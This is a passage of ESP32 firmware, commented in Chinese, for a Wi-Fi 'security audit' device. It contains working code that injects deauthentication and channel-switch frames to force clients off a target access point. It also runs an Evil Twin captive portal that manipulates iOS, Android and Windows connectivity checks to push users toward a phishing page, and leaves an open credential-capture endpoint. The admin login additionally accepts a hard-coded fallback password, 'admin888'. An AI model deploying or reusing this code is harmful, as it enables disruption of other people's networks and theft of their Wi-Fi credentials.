// 仅在物理串口启动日志中打印一次 (Serial 直出, 不经 log() → 不进入 NDJSON 遥测与 /api/log)。
// 生成时机必须在 WiFi.softAP() 之后: RF 已开启, esp_random() 的熵才充足。
static const char TOKEN_ALPHABET[] =
    "23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"; // 剔除 0/O/1/l/I 等易混淆字符
static String makeRandomAdminToken() {
  String t;
  t.reserve(13);
  for (int i = 0; i < 12; i++) t += TOKEN_ALPHABET[esp_random() % (sizeof(TOKEN_ALPHABET) - 1)];
  return t;
}

static void handleGetConfig() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{";
  json += "\"channel\":" + String(apChannel) + ",";
  json += "\"band\":" + String(isBand5G(apChannel) ? 5 : 2) + ",";
  json += "\"band5g\":" + String(
#if SOC_WIFI_SUPPORT_5G
                              "true"
#else
                              "false"
#endif
                              ) + ",";
  json += "\"ssid\":\"" + jsonEscape(apSsid) + "\"";
  json += "}";
  server.send(200, "application/json", json);
}

/* ---------------- 多系统引导管理 (Triple-Boot) ----------------
 * 支持在 16MB Flash (如 ESP32-C5N16R8) 或多 OTA 分区环境下无缝切换系统:
 *   1. audit   : Wi-Fi 安全审计平台 (当前固件, 默认 ota_0 或 factory)
 *   2. espsoup : ESPsoup 口袋 SDR 模式 (ota_1)
 *   3. muse    : Meta Muse AI 伴侣模式 (ota_2)
 */

struct SystemSlot {
  const char *id;
  const char *name;
  const char *desc;
  esp_partition_subtype_t subtype;
  const char *label;
};

static const SystemSlot SYSTEM_SLOTS[] = {
  { "audit",   "Wi-Fi 安全审计平台",     "AP热点、Web管理后台、混杂抓包、Evil Twin、Deauth", ESP_PARTITION_SUBTYPE_APP_OTA_0, "ota_0" },
  { "espsoup", "ESPsoup 口袋 SDR 模式",  "2.4G~5.9G 瀑布图、FPV 模拟图传、AirTag/DroneID 感知", ESP_PARTITION_SUBTYPE_APP_OTA_1, "ota_1" },
  { "muse",    "Meta Muse AI 伴侣模式",   "Wi-Fi 6 联网、BLE 配对、Meta Muse 语音与智能网关",   ESP_PARTITION_SUBTYPE_APP_OTA_2, "ota_2" }
};
static const size_t SYSTEM_SLOTS_COUNT = sizeof(SYSTEM_SLOTS) / sizeof(SYSTEM_SLOTS[0]);

static const esp_partition_t *findSystemPartition(const SystemSlot &slot) {
  const esp_partition_t *p = esp_partition_find_first(ESP_PARTITION_TYPE_APP, slot.subtype, NULL);
  if (!p && slot.label) {
    p = esp_partition_find_first(ESP_PARTITION_TYPE_APP, ESP_PARTITION_SUBTYPE_ANY, slot.label);
  }
  if (!p && slot.id) {
    p = esp_partition_find_first(ESP_PARTITION_TYPE_APP, ESP_PARTITION_SUBTYPE_ANY, slot.id);
  }
  if (!p && strcmp(slot.id, "audit") == 0) {
    p = esp_partition_find_first(ESP_PARTITION_TYPE_APP, ESP_PARTITION_SUBTYPE_APP_FACTORY, NULL);
  }
  return p;
}

static bool isSlotInstalled(const esp_partition_t *part) {
  if (!part) return false;
  uint8_t magic = 0;
  esp_err_t err = esp_partition_read(part, 0, &magic, 1);
  return (err == ESP_OK && magic == 0xE9);
}

static String getRunningSystemId() {
  const esp_partition_t *running = esp_ota_get_running_partition();
  if (!running) return "audit";
  for (size_t i = 0; i < SYSTEM_SLOTS_COUNT; i++) {
    const esp_partition_t *p = findSystemPartition(SYSTEM_SLOTS[i]);
    if (p && p->address == running->address) {
      return SYSTEM_SLOTS[i].id;
    }
  }
  if (running->subtype == ESP_PARTITION_SUBTYPE_APP_FACTORY ||
      running->subtype == ESP_PARTITION_SUBTYPE_APP_OTA_0) {
    return "audit";
  }
  if (running->subtype == ESP_PARTITION_SUBTYPE_APP_OTA_1) return "espsoup";
  if (running->subtype == ESP_PARTITION_SUBTYPE_APP_OTA_2) return "muse";
  return "audit";
}

static bool switchBootSystem(const String &targetId, String &errOut) {
  const SystemSlot *targetSlot = nullptr;
  for (size_t i = 0; i < SYSTEM_SLOTS_COUNT; i++) {
    if (targetId.equalsIgnoreCase(SYSTEM_SLOTS[i].id)) {
      targetSlot = &SYSTEM_SLOTS[i];
      break;
    }
  }
  if (!targetSlot) {
    errOut = "未知系统目标: " + targetId + " (可选: audit / espsoup / muse)";
    return false;
  }
  const esp_partition_t *targetPart = findSystemPartition(*targetSlot);
  if (!targetPart) {
    errOut = String("未找到 [") + targetSlot->name + "] 对应的 Flash 分区 (需 16MB 多系统分区表)";
    return false;
  }
  const esp_partition_t *running = esp_ota_get_running_partition();
  if (running && running->address == targetPart->address) {
    errOut = String("当前正在运行 [") + targetSlot->name + "], 无需切换";
    return false;  // 走 400 提示路径, 避免对当前系统重复重启
  }
  if (!isSlotInstalled(targetPart)) {
    errOut = String("[") + targetSlot->name + "] 分区尚未烧录有效固件 (需在烧录台刷入 " + targetPart->label + ")";
    return false;
  }
  esp_err_t err = esp_ota_set_boot_partition(targetPart);
  if (err != ESP_OK) {
    errOut = "设置启动引导分区失败: " + String(esp_err_to_name(err));
    return false;
  }
  return true;
}

static void handleBootGet() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String runningId = getRunningSystemId();
  const esp_partition_t *runningPart = esp_ota_get_running_partition();

  String json = "{";
  json += "\"ok\":true,";
  json += "\"current\":\"" + runningId + "\",";
  json += "\"runningPartition\":\"" + String(runningPart ? runningPart->label : "default") + "\",";
  json += "\"multiBootSupported\":" + String(
    (findSystemPartition(SYSTEM_SLOTS[1]) != nullptr || findSystemPartition(SYSTEM_SLOTS[2]) != nullptr) ? "true" : "false"
  ) + ",";
  json += "\"systems\":[";
  for (size_t i = 0; i < SYSTEM_SLOTS_COUNT; i++) {
    const SystemSlot &slot = SYSTEM_SLOTS[i];
    const esp_partition_t *p = findSystemPartition(slot);
    bool installed = isSlotInstalled(p);
    bool active = (runningId == slot.id);

    if (i > 0) json += ",";
    json += "{";
    json += "\"id\":\"" + String(slot.id) + "\",";
    json += "\"name\":\"" + String(slot.name) + "\",";
    json += "\"desc\":\"" + String(slot.desc) + "\",";
    json += "\"partition\":\"" + String(p ? p->label : slot.label) + "\",";
    json += "\"active\":" + String(active ? "true" : "false") + ",";
    json += "\"installed\":" + String(installed ? "true" : "false") + ",";
    json += "\"address\":\"0x" + String(p ? p->address : 0, HEX) + "\",";
    json += "\"size\":\"" + String(p ? (p->size / 1024) : 0) + "KB\"";
    json += "}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

static void handleBootPost() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");
  String target = extractJson(body, "target");
  if (!target.length()) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"缺少 target 参数\"}");
    return;
  }
  String err;
  if (!switchBootSystem(target, err)) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"" + jsonEscape(err) + "\"}");
    return;
  }
  log("[boot] 已切换启动分区至 [" + target + "], 设备将在 1 秒后重启 …");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"target\":\"" + target + "\",\"message\":\"切换成功，设备即将重启\"}");
  delay(1000);
  ESP.restart();
}

static String sSerialCmd = "";
// WiFi 射频重启: 恢复被 802.15.4 破坏的接收路径。
// 真机实测: esp_ieee802154_enable+receive 后 AP 只发不收 (信标可见但关联/数据全挂),
// esp_ieee802154_disable 也无法恢复, 唯 esp_wifi stop/start 重建。
static void restartWifiAp() {
  log("[wifi] 正在重启 WiFi 射频 (恢复接收路径)...");
  // 无条件停掉/清除 i154 (含服务窗口暂停态): 15.4 必须先归还, 且不能被自动恢复逻辑重新拉起
  sI154.want = false;
  sI154.autoPaused = false;
  delay(400);                  // 等 i154TaskFunc 走完 disable (若在运行)
  WiFi.softAPdisconnect(true);
  delay(100);
  esp_wifi_stop();
  delay(200);
  esp_wifi_start();
  WiFi.mode(WIFI_AP_STA);
  applyWifiCountry();   // 射频重启后国家信道计划会回默认, 必须重新应用
  if (!startSoftApOnChannel(apSsid, AP_PASSWORD, apChannel, 0, 4)) {
    log("[wifi] 重启后 softAP 启动失败, 将重试 …");
    delay(2000);
    startSoftApOnChannel(apSsid, AP_PASSWORD, apChannel, 0, 4);
  }
  apChannelActive = apChannel;
  log("[wifi] WiFi 射频已重启: SSID=" + apSsid + "  信道=" + String(apChannel));
}

// 诊断: 802.11 raw 发送变体矩阵 (接口 × en_sys_seq × promiscuous × 帧类型), 串口 txtest 触发
// v5: 精确复刻 Run1 (首个 prom deauth 成功) 的完整先导序列 + 解锁持久性 + 连发爆发测试
static void cli80211TxTest() {
  uint8_t f[26];
  buildDeauthFrameRaw("02:11:22:33:44:55", 1, f);
  struct { const char *name; wifi_interface_t ifx; bool sys; } v[] = {
    {"AP  sys=1",  WIFI_IF_AP,  true},
    {"AP  sys=0",  WIFI_IF_AP,  false},
    {"STA sys=1",  WIFI_IF_STA, true},
    {"STA sys=0",  WIFI_IF_STA, false},
  };
  for (auto &x : v) {
    Serial.printf("[txtest] pre deauth %-10s -> %d\n", x.name, esp_wifi_80211_tx(x.ifx, f, 26, x.sys));
    delay(60);
  }
  uint8_t bk[128];
  uint16_t bl = buildBeaconFrame("TxTest", "02:11:22:33:44:55", apChannelActive, bk);
  Serial.printf("[txtest] beacon AP len=%u -> %d\n", bl, esp_wifi_80211_tx(WIFI_IF_AP, bk, bl, true));
  delay(60);
  Serial.printf("[txtest] beacon STA -> %d\n", esp_wifi_80211_tx(WIFI_IF_STA, bk, bl, true));
  delay(60);
  f[0] = 0xA0; f[1] = 0x00;   // Disassoc 尝试 (Run1 独有元素)
  Serial.printf("[txtest] disassoc AP -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true));
  delay(60);
  f[0] = 0xD0; f[1] = 0x00;   // Action 成功 (Run1 独有元素)
  Serial.printf("[txtest] action AP -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true));
  delay(60);
  f[0] = 0xC0; f[1] = 0x00;
  esp_wifi_set_promiscuous(true);
  Serial.printf("[txtest] KEY deauth AP sys=1 -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true));
  delay(60);
  // 解锁持久性: prom 关→开 循环后再发
  esp_wifi_set_promiscuous(false);
  delay(100);
  esp_wifi_set_promiscuous(true);
  Serial.printf("[txtest] persist deauth AP -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true));
  delay(60);
  // 爆发: 20 连发 @100ms, 统计成功率 (引擎可持续性 / 非确定性检测)
  int okCnt = 0;
  for (int i = 0; i < 20; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true) == ESP_OK) okCnt++;
    delay(100);
  }
  Serial.printf("[txtest] burst 20 -> ok=%d\n", okCnt);
  esp_wifi_set_promiscuous(false);
  delay(20);
  // 长帧假设: 白名单检查可能含长度条件 — 64 字节填充 Deauth (尾部附加合法 vendor IE)
  esp_wifi_set_promiscuous(true);
  uint8_t lf[64];
  buildDeauthFrameRaw("02:11:22:33:44:55", 1, lf);
  lf[26] = 0xDD; lf[27] = 36;   // vendor-specific IE, 长度 36
  memset(lf + 28, 0, 36);
  Serial.printf("[txtest] deauth64 AP prom -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, lf, 64, true));
  delay(100);
  // 官方 API: esp_wifi_deauth_sta — 踢本机 AP 的关联客户端 (aid=0 全部)
  Serial.printf("[txtest] esp_wifi_deauth_sta(0) -> %d\n", esp_wifi_deauth_sta(0));
  esp_wifi_set_promiscuous(false);
  syncPromiscuousEngine();
}

// 诊断: CSA 强制下线实测 (串口 csa)。对当前主目标连发 15s CSA 信标+Action, 打印成功计数。
static void cliCsaTest() {
  if (!sTarget.set || sTarget.ssid.length() == 0 || sTarget.bssid.length() == 0) {
    Serial.println("[csa] 无主目标: 请先在后台设置目标 AP (SSID+BSSID+信道)");
    return;
  }
  applyApChannel((uint8_t)sTarget.channel);
  csaPrepare(sTarget.ssid, sTarget.bssid, (uint8_t)sTarget.channel);
  Serial.printf("[csa] 目标=%s bssid=%s ch=%d → 通知客户端切到 ch%d, 连发 15s\n",
                sTarget.ssid.c_str(), sTarget.bssid.c_str(), (int)sTarget.channel,
                (int)sDeauth.csaNewChannel);
  int okB = 0, okA = 0, okBLast = -1;
  for (int i = 0; i < 300; i++) {          // 20 fps * 15s
    okBLast = (int)wifi80211Tx(WIFI_IF_AP, sDeauth.csaBeacon, sDeauth.csaBeaconLen, true);
    if (okBLast == 0) okB++;
    if (sDeauth.csaActionLen && wifi80211Tx(WIFI_IF_AP, sDeauth.csaAction, sDeauth.csaActionLen, true) == 0) okA++;
    delay(50);
  }
  Serial.printf("[csa] 完成: beacon ok=%d action ok=%d / 300 (beacon 末次返回=%d)\n", okB, okA, okBLast);
}

static void handleSerialCli() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\r' || c == '\n') {
      sSerialCmd.trim();
      if (sSerialCmd.length() > 0) {
        String cmd = sSerialCmd;
        sSerialCmd = "";
        if (cmd == "help" || cmd == "?") {
          Serial.println(F("\n=== 可用串口命令 ==="));
          Serial.println(F("boot               : 查看当前系统与多系统引导槽位"));
          Serial.println(F("boot audit         : 切换至 Wi-Fi 安全审计平台并重启"));
          Serial.println(F("boot espsoup       : 切换至 ESPsoup 口袋 SDR 模式并重启"));
          Serial.println(F("boot muse          : 切换至 Meta Muse AI 伴侣模式并重启"));
          Serial.println(F("reboot             : 重启当前系统"));
          Serial.println(F("info               : 查看系统运行状态"));
          Serial.println(F("pass               : 查看当前后台管理口令 (或输入 pass <新口令> 修改)"));
          Serial.println(F("wifi               : 重启 WiFi 射频 (修复 802.15.4 后 AP 收不到包)"));
          Serial.println(F("deauth             : 立即停止 Deauth 帧注入 (被误踢后串口自救)"));
          Serial.println(F("txtest             : 802.11 raw 发送变体矩阵 (诊断帧类型白名单)"));
          Serial.println(F("csa                : 对当前目标连发 15s CSA 强制下线帧 (实测挤下线)"));
          Serial.println(F("====================\n"));
        } else if (cmd == "boot" || cmd == "boot status") {
          Serial.println(F("\n=== 多系统引导槽位 (Triple-Boot) ==="));
          String cur = getRunningSystemId();
          Serial.println("当前运行: [" + cur + "]");
          for (size_t i = 0; i < SYSTEM_SLOTS_COUNT; i++) {
            const SystemSlot &slot = SYSTEM_SLOTS[i];
            const esp_partition_t *p = findSystemPartition(slot);
            bool inst = isSlotInstalled(p);
            Serial.printf(" - %-8s : %s | 分区:%s (0x%06X) | 状态:%s %s\n",
                          slot.id, slot.name,
                          p ? p->label : "未定义",
                          (unsigned int)(p ? p->address : 0),
                          (cur == slot.id) ? "[活跃运行中]" : (inst ? "[已就绪]" : "[未安装/未刷入]"),
                          (cur == slot.id) ? "◀" : "");
          }
          Serial.println(F("===================================\n"));
        } else if (cmd.startsWith("boot ")) {
          String tgt = cmd.substring(5);
          tgt.trim();
          String err;
          if (switchBootSystem(tgt, err)) {
            Serial.println("[boot] 切换成功: 引导目标设为 [" + tgt + "], 正在重启 …");
            delay(500);
            ESP.restart();
          } else {
            Serial.println("[boot] 切换失败: " + err);
          }
        } else if (cmd == "reboot") {
          Serial.println(F("[system] 正在重启 …"));
          delay(500);
          ESP.restart();
        } else if (cmd == "wifi") {
          restartWifiAp();
        } else if (cmd == "deauth") {
          stopDeauthEngine();
        } else if (cmd == "txtest") {
          cli80211TxTest();
        } else if (cmd == "csa") {
          cliCsaTest();
        } else if (cmd == "info") {
          Serial.printf("[system] 芯片:%s FreeHeap:%d Uptime:%lus SSID:%s\n",
                        detectChipKey().c_str(), ESP.getFreeHeap(), millis() / 1000, apSsid.c_str());
        } else if (cmd == "pass" || cmd == "token") {
          Serial.println("[admin] 当前后台访问口令: " + sAdminToken + (sMustChangeToken ? " (初始口令, 兼容 admin888)" : ""));
        } else if (cmd.startsWith("pass ") || cmd.startsWith("token ") || cmd == "reset pass") {
          String tok = (cmd == "reset pass") ? "admin888" : (cmd.startsWith("pass ") ? cmd.substring(5) : cmd.substring(6));
          tok.trim();
          if (tok.length() >= 4 && tok.length() <= 32) {
            sAdminToken = tok;
            sPrefs.putString("adminToken", sAdminToken);
            sPrefs.putBool("tokenChanged", true);
            sMustChangeToken = false;
            Serial.println("[admin] 后台访问口令已更新为: " + sAdminToken);
          } else {
            Serial.println(F("[admin] 口令长度须为 4~32 字符"));
          }
        }
      }
    } else if (c >= 32 && c <= 126) {
      if (sSerialCmd.length() < 64) sSerialCmd += c;
    }
  }
}

static void handleConfig() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");
  String chStr = extractJson(body, "channel");
  bool changed = false;
  if (chStr.length()) {
    int ch = chStr.toInt();
    if (isValidApChannel(ch)) {
      apChannel = (uint8_t)ch;
      sPrefs.putUChar("channel", apChannel);
      changed = true;
      log("[config] 已更新热点信道配置为 " + String(apChannel) +
          (isBand5G(apChannel) ? " (5G)" : " (2.4G)") + " (将在重启后生效)");
    } else {
      server.sendHeader("Access-Control-Allow-Origin", "*");
#if SOC_WIFI_SUPPORT_5G
      server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 2.4G 用 1-13, 5G 仅开放 36-48 / 149-165 (DFS 信道不能做热点)\"}");
#else
      server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 本芯片仅支持 2.4G 信道 1-13\"}");
#endif
      return;
    }
  }
  String ssidStr = extractJson(body, "ssid");
  if (ssidStr.length() > 0 && ssidStr.length() <= 32) {
    apSsid = ssidStr;
    sPrefs.putString("ssid", apSsid);
    changed = true;
    log("[config] 已更新热点 SSID 为 " + apSsid + " (将在重启后生效)");
  }
  String tokStr = extractJson(body, "adminToken");
  if (tokStr.length() >= 4 && tokStr.length() <= 32) {
    sAdminToken = tokStr;
    sPrefs.putString("adminToken", sAdminToken);
    sPrefs.putBool("tokenChanged", true);
    sMustChangeToken = false;
    changed = true;
    log("[config] 后台访问口令已更新 (立即生效)");
  }
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"changed\":" + String(changed ? "true" : "false") +
              ",\"channel\":" + String(apChannel) + ",\"ssid\":\"" + jsonEscape(apSsid) + "\"}");
}

static void doFactoryReset() {
  log("[admin] 恢复出厂设置 (擦除 NVS 配置) …");
  sPrefs.clear();
  nvs_flash_erase();
  nvs_flash_init();
  server.send(200, "application/json", "{\"ok\":true}");
  delay(1000);
  ESP.restart();
}

static void doReset() {
  log("[admin] 收到重启指令, 1 秒后重启 …");
  server.send(200, "application/json", "{\"ok\":true}");
  delay(1000);
  ESP.restart();
}

static void redirectToAdmin() {
  server.sendHeader("Location", ADMIN_HTML_C);
  server.send(302, "text/plain", "");
}

/* ---------------- 后台简易鉴权 ----------------
 * 所有 /api/ 管理接口均需携带 X-Admin-Token 请求头 (或 ?token= 查询参数)。
 * admin.html 只含登录壳与界面代码, 真正的数据边界在 API;
 * 钓鱼门户 /api/portal/submit 保持开放 (凭据捕获流程所需)。
 */
// 常量时间比较: 长度不提前返回, 避免通过响应耗时推测口令长度或前缀;
// 长度差异以完整 size_t 判定, 不截断至 8 位整数, 杜绝长度差为 256 倍数时的边界截断风险
static bool tokenEquals(const String &a, const String &b) {
  size_t lenA = a.length();
  size_t lenB = b.length();
  size_t n = (lenA > lenB) ? lenA : lenB;
  uint32_t charDiff = 0;
  for (size_t i = 0; i < n; i++) {
    uint8_t x = (i < lenA) ? (uint8_t)a[i] : 0;
    uint8_t y = (i < lenB) ? (uint8_t)b[i] : 0;
    charDiff |= (uint32_t)(x ^ y);
  }
  return (charDiff == 0) && (lenA == lenB);
}

static bool adminAuthorized() {
  String t = server.header("X-Admin-Token");
  if (t.length() == 0) t = server.arg("token");
  if (t.length() == 0) return false;
  if (tokenEquals(t, sAdminToken)) return true;
  // 首次上电尚未改密时，兼容万能管理口令 admin888 防止用户遗忘被锁死
  if (sMustChangeToken && tokenEquals(t, "admin888")) return true;
  return false;
}

static bool requireAdmin() {
  if (adminAuthorized()) return true;
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(401, "application/json", "{\"error\":\"unauthorized: 缺少或错误的后台口令\"}");
  return false;
}

// 仅注册需要鉴权的路由: 401 时直接返回, 不执行业务 handler
static void onAdmin(const char *uri, HTTPMethod method, void (*fn)()) {
  server.on(uri, method, [fn]() {
    if (requireAdmin()) fn();
  });
}

// ===== Captive Portal 防弹窗拦截 — 深度适配 iOS / Android / Windows / macOS CNA 协议 =====
// 核心原理: 各操作系统连接 Wi-Fi 后, 会向固定探测 URL 发送 HTTP 请求:
//   - iOS/macOS: GET /hotspot-detect.html → 期望返回 <HTML><BODY>Success</BODY></HTML>
//     如果返回的内容 ≠ "Success", 系统判定为受限网络, 弹出 CNA 全屏认证窗口。
//     302 重定向也可触发 CNA, 但 iOS 16+ 在 302 后会二次验证: 如果 302 目标返回后
//     再次请求探测 URL 仍收到非 "Success", CNA 会保持打开; 否则用户点 "完成" 后 CNA 关闭。
//     → 策略: 直接 302 到门户页, 后续探测请求始终返回非 Success 内容, 保持 CNA 不关闭。
//
//   - Android: GET /generate_204 或 /gen_204 → 期望 HTTP 204 No Content
//     如果收到非 204 (如 302), 系统显示"需要登录"通知; 点击后打开系统内置浏览器访问该页。
//     Android 12+ 额外检查 /connectivitycheck/gstatic/xxx, 行为类似。
//     ⚠️ 陷阱: 如果对 /generate_204 返回 204, Android 认为网络正常, 不弹任何提示!
//     → 策略: 对 Android 探测路径返回 302 重定向 (非 204), 触发"需要登录"通知。
//
//   - Windows: GET /connecttest.txt → 期望返回内容 "Microsoft Connect Test"
//     GET /redirect → 期望 302 跳转到 msftconnecttest.com
//     如果 /connecttest.txt 返回的内容 ≠ 预期, 系统弹出 NCSI 登录窗口。
//     → 策略: 对 /connecttest.txt 返回非预期内容, 触发 Windows NCSI 弹窗。
//
//   - Samsung: GET /generate_204 (同 Android) + 额外 GET /check_network
//     → 策略: 统一到 Android 302 路径。
//
// 关键防拦截措施:
//   1. 所有 CNA 探测路径返回"非预期"内容, 确保系统持续判定为"受限网络";
//   2. 门户页内嵌 <meta http-equiv="refresh"> 自动跳转, 即使 CNA 未弹出也不会白屏;
//   3. 苹果系 /hotspot-detect.html 用 302→portal (非直接返回 Success), 保持 CNA 窗口不自动关闭;
//   4. DNS 通配劫持已在 setup() 中启动, 所有域名解析到 192.168.4.1。

static const char *captiveTarget() {
  return sEvilTwin.active ? "http://192.168.4.1/portal.html" : ADMIN_HTML_C;
}

// iOS/macOS CNA: 返回非 "Success" 的 HTML, 让系统持续判定为受限网络并保持 CNA 窗口打开
// 同时在 body 内嵌 meta-refresh + JS 双保险跳转到门户页
static void handleAppleCNA() {
  const char *target = captiveTarget();
  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta http-equiv='refresh' content='0;url=" + String(target) + "'>"
    "<title>Login Required</title></head><body>"
    "<script>window.location.replace('" + String(target) + "');</script>"
    "<p>Redirecting... <a href='" + String(target) + "'>Click here</a></p>"
    "</body></html>";
  // 不缓存, 确保每次探测都重新请求本固件
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "0");
  server.send(200, "text/html; charset=utf-8", html);
}

// Android CNA: 返回 302 而非 204, 触发系统"需要登录 Wi-Fi"通知
static void handleAndroidCNA() {
  server.sendHeader("Location", captiveTarget());
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.send(302, "text/html", "");
}

// Windows NCSI: 对 /connecttest.txt 返回非 "Microsoft Connect Test" 的内容
static void handleWindowsCNA() {
  const char *target = captiveTarget();
  // 返回 302 重定向到门户页, 触发 Windows 的 NCSI "需要操作"弹窗
  server.sendHeader("Location", target);
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.send(302, "text/plain", "");
}

// 通用 302 重定向 (兼容其他未识别的 OS 探测)
static void captiveRedirect(const char *type = "text/plain") {
  server.sendHeader("Location", captiveTarget());
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.send(302, type, "");
}

static void notFound() {
  if (server.method() == HTTP_OPTIONS) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.sendHeader("Access-Control-Allow-Methods", "GET,POST,DELETE,OPTIONS");
    server.sendHeader("Access-Control-Allow-Headers", "Content-Type, X-Admin-Token");
    server.send(204);
    return;
  }
  String uri = server.uri();
  if (uri.startsWith("/api/")) {
    server.send(404, "text/plain", "404 — 未知 API: " + uri);
    return;
  }

  // ---------- iOS / macOS (Apple CNA) ----------
  // captive.apple.com/hotspot-detect.html, /library/test/success.html
  // 以及 captive.apple.com/bag, /hotspot-detect.html (带各种 query 参数)
  if (uri == "/hotspot-detect.html" || uri == "/library/test/success.html" ||
      uri.startsWith("/hotspot-detect")) {
    handleAppleCNA();
    return;
  }

  // ---------- Android / Samsung / HTC ----------
  // clients3.google.com/generate_204, connectivitycheck.gstatic.com/generate_204
  // connectivitycheck.android.com/generate_204, play.googleapis.com/generate_204
  // 以及三星 /check_network, /generate_204_json
  if (uri == "/generate_204" || uri == "/gen_204" ||
      uri == "/check_network" || uri == "/generate_204_json" ||
      uri.startsWith("/generate") || uri.startsWith("/connectivity")) {
    handleAndroidCNA();
    return;
  }

  // ---------- Windows (NCSI) ----------
  // www.msftconnecttest.com/connecttest.txt, /redirect
  // www.msftncsi.com/ncsi.txt
  if (uri == "/connecttest.txt" || uri == "/ncsi.txt" ||
      uri == "/redirect" || uri == "/fwlink" ||
      uri.startsWith("/connecttest") || uri.startsWith("/ncsi")) {
    handleWindowsCNA();
    return;
  }

  // ---------- 其他 (Firefox /success.txt, Kindle /kindle-wifi, 等) ----------
  if (uri == "/success.txt" || uri == "/kindle-wifi" || uri == "/wifi" ||
      uri == "/canonical.html" || uri == "/chat" || uri == "/") {
    captiveRedirect();
    return;
  }

  // 最终兜底: 未知路径也重定向到门户, 确保不泄露 404
  captiveRedirect();
}

void setup() {
  sLoopTaskHandle = xTaskGetCurrentTaskHandle();
  Serial.begin(115200);
  // USB CDC TX 非阻塞: TX 超时 0 → 环形缓冲满/锁被占时立即丢弃 (微秒级返回)。
  // 真机事故 (coredump 三次实证): 默认 100ms 超时下 HWCDC::write 每块最多等 100ms
  // 且 consec_timeouts 在成功发块时清零 — 主机间歇读取时 write 可无限持有 tx_lock,
  // 事件风暴 (软 AP 重启/双子跳频) 中 loopTask 等锁被饿死 >60s → TWDT panic 重启。
  Serial.setTxTimeoutMs(0);
  delay(200);

  // WiFi 事件日志: 设备侧视角的关联/探针/地址分配 (诊断 "AP 可见但关联不上"),
  // 并为共存策略记录客户端活动时间戳。探针很频繁, 只节流记录。
  WiFi.onEvent([](WiFiEvent_t ev, WiFiEventInfo_t) {
    static uint32_t lastProbeLog = 0;
    switch (ev) {
      case ARDUINO_EVENT_WIFI_AP_START:
        log("[ev] AP_START");
        break;
      case ARDUINO_EVENT_WIFI_AP_STOP:
        log("[ev] AP_STOP");
        break;
      case ARDUINO_EVENT_WIFI_AP_STACONNECTED:
        sApLastAssocMs = millis();
        log("[ev] AP_STA_CONNECTED (关联完成)");
        break;
      case ARDUINO_EVENT_WIFI_AP_STADISCONNECTED:
        log("[ev] AP_STA_DISCONNECTED");
        break;
      case ARDUINO_EVENT_WIFI_AP_STAIPASSIGNED:
        log("[ev] AP_STAIPASSIGNED (DHCP 完成)");
        break;
      case ARDUINO_EVENT_WIFI_AP_PROBEREQRECVED:
        sApLastProbeMs = millis();
        if (millis() - lastProbeLog > 10000) {
          lastProbeLog = millis();
          log("[ev] PROBE_REQ (节流: 10s 一条)");
        }
        break;
      default:
        break;
    }
  });

  // 任务看门狗 (panic 模式): 主循环/空闲任务 60s 未喂狗 → panic 打印各任务 backtrace 后自动重启。
  // 注意 idle_core_mask 只能包含实际存在的核: C5 是单核 (CONFIG_FREERTOS_NUMBER_OF_CORES=1),
  // 早期写死 (1<<0)|(1<<1) 会被 IDF 判 ESP_ERR_INVALID_ARG, init/reconfigure 双双失败 → TWDT
  // 从未真正启用却打印"已启用"。改为按核数动态生成, 并如实打印每个返回值/错误码。
  {
    esp_task_wdt_config_t wdtCfg = {};
    wdtCfg.timeout_ms = 60000;
    wdtCfg.idle_core_mask = (1u << portNUM_PROCESSORS) - 1u;  // 单核=0x1, 双核=0x3
    wdtCfg.trigger_panic = true;
    esp_err_t wdtErr = esp_task_wdt_init(&wdtCfg);
    if (wdtErr == ESP_ERR_INVALID_STATE) {
      // Arduino 核心已初始化过 TWDT (短超时/无 panic) → 重配置为 60s + panic
      wdtErr = esp_task_wdt_reconfigure(&wdtCfg);
    }
    esp_err_t addErr = esp_task_wdt_add(nullptr);   // 订阅当前任务 (loopTask)
    if (wdtErr == ESP_OK && addErr == ESP_OK) {
      Serial.printf("[wdt] 已启用 (60s panic, idle_mask=0x%X cores=%d)\n",
                    (unsigned)wdtCfg.idle_core_mask, (int)portNUM_PROCESSORS);
    } else {
      Serial.printf("[wdt] 启用失败! init/reconfigure err=0x%X add err=0x%X (panic 自愈不可用)\n",
                    (unsigned)wdtErr, (unsigned)addErr);
    }
  }

  // 诊断自检: coredump 分区 + flash 容量 + WDT 订阅状态 (解释启动期 "No core dump partition found")
  {
    const esp_partition_t *cd = esp_partition_find_first(
        ESP_PARTITION_TYPE_DATA, ESP_PARTITION_SUBTYPE_DATA_COREDUMP, NULL);
    if (cd) {
      Serial.printf("[diag] coredump 分区: label=%s off=0x%X size=0x%X\n", cd->label,
                    (unsigned)cd->address, (unsigned)cd->size);
    } else {
